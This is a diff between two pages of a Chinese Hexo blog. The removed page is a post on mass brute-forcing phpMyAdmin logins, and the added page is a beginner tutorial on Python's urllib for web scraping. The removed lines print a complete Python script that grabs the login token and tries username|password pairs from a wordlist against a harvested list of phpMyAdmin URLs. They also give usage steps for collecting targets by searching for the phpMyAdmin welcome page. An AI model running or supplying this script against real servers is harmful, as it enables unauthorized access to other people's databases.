@@ -4,10 +4,10 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="python批量爆破phpMyadmin, 星晴">
-    <meta name="description" content="使用python实现phpMyadmin的批量爆破0x01 脚本实现import requests
-from bs4 import BeautifulSoup as bp
-def attack(url,username,password):">
+    <meta name="keywords" content="python 爬虫基本库的使用, 星晴">
+    <meta name="description" content="1.urllib库python3中将python2中的urllib和urllib2两个库统一起来，统一为urllib库，它分为四个模块。
+request:发送HTTP请求的模块。
+error:异常处理模块，如果出现请求异常，可以获得异常并且">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -15,7 +15,7 @@ def attack(url,username,password):">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>python批量爆破phpMyadmin | 星晴</title>
+    <title>python 爬虫基本库的使用 | 星晴</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -259,13 +259,13 @@ def attack(url,username,password):">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        python批量爆破phpMyadmin
+                        python 爬虫基本库的使用
                     </div>
                 </div>
             </div>
@@ -376,8 +376,8 @@ def attack(url,username,password):">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/python黑客编程/" target="_blank">
-                                <span class="chip bg-color">python黑客编程</span>
+                            <a href="/tags/python爬虫/" target="_blank">
+                                <span class="chip bg-color">python爬虫</span>
                             </a>
                         
                     </div>
@@ -391,7 +391,7 @@ def attack(url,username,password):">
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-04-12
+                    2019-04-13
                 </div>
 
                 
@@ -407,52 +407,74 @@ def attack(url,username,password):">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="使用python实现phpMyadmin的批量爆破"><a href="#使用python实现phpMyadmin的批量爆破" class="headerlink" title="使用python实现phpMyadmin的批量爆破"></a>使用python实现phpMyadmin的批量爆破</h2><h3 id="0x01-脚本实现"><a href="#0x01-脚本实现" class="headerlink" title="0x01 脚本实现"></a>0x01 脚本实现</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
-<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup <span class="token keyword">as</span> bp
-<span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span><span class="token string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"</span><span class="token punctuation">}</span>
-    session<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token keyword">try</span><span class="token punctuation">:</span>
-        response<span class="token operator">=</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
-        soup<span class="token operator">=</span>bp<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">"lxml"</span><span class="token punctuation">)</span>
-        my_Dict<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"hidden"</span><span class="token punctuation">,</span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string">"token"</span><span class="token punctuation">}</span>
-        tiqu<span class="token operator">=</span>soup<span class="token punctuation">.</span>find<span class="token punctuation">(</span>attrs<span class="token operator">=</span>my_Dict<span class="token punctuation">)</span>
-        data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
-        data<span class="token punctuation">[</span><span class="token string">"token"</span><span class="token punctuation">]</span><span class="token operator">=</span>tiqu<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
-        <span class="token keyword">if</span> data<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>
-            <span class="token keyword">return</span> <span class="token string">"no token"</span>
-        data<span class="token punctuation">[</span><span class="token string">'pma_username'</span><span class="token punctuation">]</span><span class="token operator">=</span>username
-        data<span class="token punctuation">[</span><span class="token string">'pma_password'</span><span class="token punctuation">]</span><span class="token operator">=</span>password
-        index_url<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"index.php"</span>
-        response1<span class="token operator">=</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>index_url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
-        htmls<span class="token operator">=</span>response1<span class="token punctuation">.</span>text
-        <span class="token keyword">if</span> <span class="token string">"phpMyAdmin is more friendly with a "</span> <span class="token keyword">in</span> htmls<span class="token punctuation">:</span>
-            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] username:{0}, password:{1}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span>
-        <span class="token keyword">else</span><span class="token punctuation">:</span>
-            <span class="token keyword">pass</span>
-    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
-        <span class="token keyword">pass</span>
+                <h2 id="1-urllib库"><a href="#1-urllib库" class="headerlink" title="1.urllib库"></a>1.urllib库</h2><p><code>python3</code>中将<code>python2</code>中的<code>urllib</code>和<code>urllib2</code>两个库统一起来，统一为<code>urllib</code>库，它分为四个模块。</p>
+<p><code>request</code>:发送<code>HTTP</code>请求的模块。</p>
+<p><code>error</code>:异常处理模块，如果出现请求异常，可以获得异常并且进行处理</p>
+<p><code>parse</code>: 提供对<code>URL</code>处理方法，拆分、解析、合并等。</p>
+<p><code>robotparser</code>:用来识别网站的<code>robots.txt</code>文件，然后判断哪些网站可以爬，那些不可爬。</p>
+<h2 id="2-request发送请求模块"><a href="#2-request发送请求模块" class="headerlink" title="2. request发送请求模块"></a>2. request发送请求模块</h2><p><code>request</code>模块可以模拟浏览器发出<code>HTTP</code>请求，同时带有处理授权验证、重定向、<code>cookies</code>以及其他内容。</p>
+<h3 id="2-1-urlopen"><a href="#2-1-urlopen" class="headerlink" title="2.1 urlopen()"></a>2.1 urlopen()</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request
 
+response<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'http://www.baidu.com'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 
-<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
-    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'./Good.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> urls<span class="token punctuation">:</span>
-        host_t<span class="token operator">=</span>urls<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
-        <span class="token keyword">for</span> url <span class="token keyword">in</span> host_t<span class="token punctuation">:</span>
-            <span class="token keyword">if</span> url<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'\n'</span><span class="token punctuation">:</span>
-                url<span class="token operator">=</span>url<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
-            <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"mima.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> mima<span class="token punctuation">:</span>
-                my_mima<span class="token operator">=</span>mima<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
-                <span class="token keyword">for</span> mima <span class="token keyword">in</span> my_mima<span class="token punctuation">:</span>
-                    username<span class="token punctuation">,</span>password<span class="token operator">=</span>mima<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"|"</span><span class="token punctuation">)</span>
-                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"attack {0} use username:{1}|password:{2}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>url<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span>
-                    attack<span class="token punctuation">(</span>url<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span>
-
+<span class="token keyword">print</span><span class="token punctuation">(</span>type<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>getheaders<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>status<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>getheader<span class="token punctuation">(</span><span class="token string">'Server'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 </code></pre>
-<h3 id="0x02-脚本的使用"><a href="#0x02-脚本的使用" class="headerlink" title="0x02 脚本的使用"></a>0x02 脚本的使用</h3><ul>
-<li>先用批量采集工具采集url（关键词：“欢迎使用 phpMyadmin”）</li>
-<li>将采集的url导出为Good.txt路径</li>
-<li>然后密码的格式为:    root|toor  ，|左边为root,右边为toor</li>
-</ul>
+<p>通过上面代码可以对网站进行<code>http</code>请求，将获得的相应存储在<code>response</code>里面，<code>response</code>是一个<code>HTTPResponse</code>对象，主要包含<code>read()</code>、<code>readinto()</code>、<code>getheader(name)</code>、<code>getheaders()</code>、<code>fileno()</code>等方法，以及<code>msg</code>、<code>version</code>、<code>status</code>等属性，<code>type(response)</code>将显示出<code>response</code>的属性，</p>
+<pre><code>&lt;class &#39;http.client.HTTPResponse&#39;&gt;
+</code></pre><p><strong>注意：response.getheaders() 返回头部所有的信息，然后resopnse.gethead(‘name’)是返回指定的头部名称信息，它没有S。</strong></p>
+<p>函数的格式：</p>
+<pre><code>urllib.request.urlopen(url, data=None, [timeout, ]*, cafile=None, capath=None, cadefault=False, context=None)
+</code></pre><p>参数说明：</p>
+<p><code>data</code>是<code>post</code>传值的数据，可以传递表单</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'qin'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre>
+<p><code>urllib.parse.urlencode</code>是将字典转换成字符串，最后变成</p>
+<pre class=" language-python"><code class="language-python">name<span class="token operator">=</span>qin<span class="token punctuation">,</span>data <span class="token operator">=</span> bytes<span class="token punctuation">(</span>urllib <span class="token punctuation">.</span> parse <span class="token punctuation">.</span> urlencode<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'word ’:’ hello'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> encoding ＝’ ut <span class="token number">8</span>'<span class="token punctuation">)</span>
+</code></pre>
+<p><code>timeout</code>参数:</p>
+<p>用来设置超时时间，单位是秒，支持<code>ftp</code>,<code>http</code>,<code>https</code>请求</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socket
+<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request
+<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>error
+
+<span class="token keyword">try</span><span class="token punctuation">:</span>
+    response<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'****'</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">)</span>
+<span class="token keyword">except</span> urllib<span class="token punctuation">.</span>error<span class="token punctuation">.</span>URLError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+    <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>e<span class="token punctuation">.</span>reason<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>timeout<span class="token punctuation">)</span><span class="token punctuation">:</span>
+       <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'TIME OUT'</span><span class="token punctuation">)</span>
+</code></pre>
+<p>其他参数:</p>
+<p><code>context</code>是指定<code>ssl</code>设置的，<code>cafile</code>和<code>capath</code>是指定证书和路径的。</p>
+<h3 id="2-2-使用Request对象来发出请求"><a href="#2-2-使用Request对象来发出请求" class="headerlink" title="2.2. 使用Request对象来发出请求"></a>2.2. 使用Request对象来发出请求</h3><p>因为<code>urlopen()</code>可以实现最基本的请求，但是不足用来构建一个完整的请求。如果加入<code>Headers</code>等信息，需要利用更加强大的<code>Request</code>类</p>
+<p><code>Request</code>对象：</p>
+<pre><code>class urllib.request.Request(ur1,data=None,headers={},origin_req_host=None,unverifiable=False,method=None) 
+</code></pre><p><code>url</code>是必传参数，<code>data</code>可选，必须是字节流使用<code>bytes</code>类型，字典的话得用<code>urllib.parse</code>模块的<code>urlencode()</code>编码，第三个参数<code>headers</code>是字典，是请求头，<code>origin_req_host</code>是请求方的<code>ip</code>或者<code>host</code>名称，第六个是<code>method</code>,<code>get</code>、<code>post</code>等</p>
+<p>实例：</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> urllib <span class="token keyword">import</span> request<span class="token punctuation">,</span>parse
+url<span class="token operator">=</span><span class="token string">'http://httpbin.org/post'</span>
+headers<span class="token operator">=</span><span class="token punctuation">{</span>
+    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/4.0(compatible;MSIE 5-5;Windows NT'</span><span class="token punctuation">,</span>
+    <span class="token string">'Host'</span><span class="token punctuation">:</span><span class="token string">'httpbin.org'</span>
+<span class="token punctuation">}</span>
+
+dict<span class="token operator">=</span><span class="token punctuation">{</span>
+    <span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'qinjian'</span>
+<span class="token punctuation">}</span>
+
+data<span class="token operator">=</span>bytes<span class="token punctuation">(</span>parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span>dict<span class="token punctuation">)</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>
+req<span class="token operator">=</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>method<span class="token operator">=</span><span class="token string">'POST'</span><span class="token punctuation">)</span>
+response<span class="token operator">=</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+headers也可以使用add_header<span class="token punctuation">(</span><span class="token punctuation">)</span>方法来添加：
+
+req<span class="token operator">=</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>method<span class="token operator">=</span><span class="token string">'POST'</span><span class="token punctuation">)</span>
+req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">'User-Agent'</span><span class="token punctuation">,</span><span class="token string">'Mozilla/4.0(compatible;MSIE 5-5;Windows NT'</span><span class="token punctuation">)</span>
+</code></pre>
+<h3 id="2-3-高级用法"><a href="#2-3-高级用法" class="headerlink" title="2.3 高级用法"></a>2.3 高级用法</h3><p><code>handle</code>用来处理登陆验证的，可以代理设置也可以处理<code>cookie</code>。</p>
 
             </div>
             <hr>
@@ -600,7 +622,7 @@ def attack(url,username,password):">
                     </span>
                     <a href="http://yoursite.com" class="b-link-green">星晴</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2019/04/12/python-pi-liang-sao-miao-phpmyadmin-ruo-kou-ling/" class="b-link-green">python批量爆破phpMyadmin</a>
+                    <a href="/2019/04/13/python-pa-chong-ji-ben-ku-de-shi-yong/" class="b-link-green">python 爬虫基本库的使用</a>
                 </p>
             </div>
         </div>
@@ -623,25 +645,26 @@ def attack(url,username,password):">
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2019/04/12/shou-xie-python-pa-chong-xia-zai-dian-zi-shu-yi-jian-fa-song-zhi-kindle/">
+                <a href="/2019/04/13/python-pa-chong-ji-ben-ku-de-shi-yong/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="手写python爬虫下载电子书一键发送到kindle">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="python 爬虫基本库的使用">
                         
-                        <span class="card-title">手写python爬虫下载电子书一键发送到kindle</span>
+                        <span class="card-title">python 爬虫基本库的使用</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">1.概述由于平时喜欢看书，但是发现一些推送的服务号没有自己想要的电子书，最近再学习爬虫，就想小试牛刀，主要用到的技术：
-使用python的requests模块进行网站信息的爬取
-解析我使用了两个方式，正则表达式和pyquery库进行html</div>
+                    <div class="summary">1.urllib库python3中将python2中的urllib和urllib2两个库统一起来，统一为urllib库，它分为四个模块。
+request:发送HTTP请求的模块。
+error:异常处理模块，如果出现请求异常，可以获得异常并且</div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-12
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-13
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-user fa-fw"></i>
@@ -650,6 +673,7 @@ def attack(url,username,password):">
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -668,17 +692,17 @@ def attack(url,username,password):">
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/04/12/ji-qi-xue-xi-zhi-xian-xing-hui-gui-fang-fa/">
+                <a href="/2019/04/12/empire-powershell-shen-tou-gong-ji-kuang-jia-gong-ju/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="机器学习之线性回归方法">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="Empire-powershell渗透攻击框架工具">
                         
-                        <span class="card-title">机器学习之线性回归方法</span>
+                        <span class="card-title">Empire-powershell渗透攻击框架工具</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">1. 多元线性回归以预测房子价格为例，房子的属性除了其面积大小外，这里还有房子楼层数、房子年龄、厅室数等。也就是说一个房子的特征将不只一个，而是多个。这里用n表示特征数目，x(i)表示的是训练集中第i个样本的特征向量，x(i)j表示的第i个</div>
+                    <div class="summary">1. 工具简介Empire是一款针对windows平台的、使用Powershell脚本作为攻击载荷的渗透攻击框架工具，具有从stager生成、提权到渗透维持的一系列功能。Empire实现不需要powershell.exe就可以运行的Powe</div>
                     <div class="publish-info">
                             <span class="publish-date">
                                 <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-12
@@ -694,8 +718,8 @@ def attack(url,username,password):">
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/机器学习/" target="_blank">
-                        <span class="chip bg-color">机器学习</span>
+                    <a href="/tags/渗透测试/" target="_blank">
+                        <span class="chip bg-color">渗透测试</span>
                     </a>
                     
                 </div>
